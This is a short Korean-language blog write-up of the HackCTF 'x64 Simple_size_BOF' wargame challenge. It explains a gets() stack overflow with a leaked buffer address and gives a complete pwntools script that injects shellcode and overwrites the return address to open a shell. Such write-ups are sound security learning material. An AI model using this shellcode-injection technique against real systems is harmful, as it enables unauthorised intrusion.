---
title: "[ HackCTF ] x64 Simple_size_BOF"
date: 2023-03-07T14:57:26.817Z
categories: ['Wargame', 'HackCTF']
tags: ['HackCTF',"pwn"]
---

### **문제 분석**
---
![](/images/0cef7894-1abf-410b-97af-d0ec6b2a36d4-image.png)

gets에서 BOF 취약점을 찾을 수 있다.

또한 puts를 통해 buffer의 주소를 알려주고 있다.

<br>
<br>

### **문제 풀이**
---
buffer에 쉘코드를 넣고 gets에서 BOF를 통해 return address를 buffer로 덮어주면 된다.

<br>

payload는 다음과 같이 작성하면 된다.

```shellcode - dummy(27952(buffer size)+8(rbp)-length(shellcode)) + (buffer address)```

<br>

exploit 코드는 다음과 같다

```python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3005)

p.recvuntil('buf: ')
buf = int(p.recv(14),16)

context.arch = 'amd64'
shellcode = asm(shellcraft.sh())

payload = ''
payload += shellcode
payload += '\x90'*(0x6d38-len(shellcode))
payload += p64(buf)

p.sendline(payload)
p.interactive()
```